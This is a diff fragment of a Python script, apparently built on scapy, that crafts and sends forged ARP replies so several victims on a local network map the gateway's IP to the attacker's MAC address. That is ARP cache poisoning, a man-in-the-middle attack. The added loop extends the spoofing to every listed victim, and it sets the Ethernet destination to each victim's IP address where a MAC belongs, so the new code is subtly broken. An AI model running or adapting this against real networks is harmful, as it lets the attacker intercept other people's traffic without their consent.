@@ -65,11 +65,14 @@ def arp():
 	ap_ip, ap_mac = ap(vip,vmac)
 	print(ap_ip,ap_mac)
 
-
 	p = []
+	for i in range(len(vip)):
+		p.append(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
+		hwdst=vmac[i], hwsrc=attacker_mac, op=2))		
+	print(p)
+	
 	# for i in range(len(vip)):
-	p.append(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
+	
 	for i in range(10):
 		print('send arp ', i)
 		sendp(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
